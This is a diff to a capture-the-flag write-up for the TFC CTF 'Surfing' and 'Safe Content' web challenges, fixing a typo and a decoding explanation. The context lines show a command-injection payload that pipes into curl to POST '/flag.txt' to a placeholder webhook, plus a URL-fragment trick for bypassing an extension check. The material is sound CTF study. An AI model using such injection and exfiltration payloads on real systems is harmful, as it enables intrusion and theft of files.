@@ -60,7 +60,7 @@ This time, it performed the redirection without any warnings. Let's try it in th
 
 ![](/assets/images/2024-08-04-TFC-CTF-Surfing-and-Safe-Content/error2.png)
 
-Again, we get a `404 Not Found`. The challenge seems to be appending `.png` to the end of the URL, without checking the type of content being accessed. We can easily bypass this by putting a URL-encoded `#` at the end of out URL, thus making `.png` a URL fragment:
+Again, we get a `404 Not Found`. The challenge seems to be appending `.png` to the end of the URL, without checking the type of content being accessed. We can easily bypass this by putting a URL-encoded `#` at the end of our URL, thus making `.png` a URL fragment:
 
 ![](/assets/images/2024-08-04-TFC-CTF-Surfing-and-Safe-Content/nice.png)
 
@@ -178,7 +178,7 @@ The `isAllowedIP` function uses `parse_url` to check the URL's host. However, it
 a | curl -X POST -d @/flag.txt <WEBHOOK>
 ```
 
-Now we double base64-encode it (`fetchContent` decodes it once, and then it is decoded again in the `exec` call) and we send the following URL to the challenge:
+Now we double base64-encode it (the PHP wrapper decodes it once and then `fetchContent` decodes it again in the return) and we send the following URL to the challenge:
 
 ```
 data://localhost/plain;base64,<DOUBLE_BASE64_PAYLOAD>
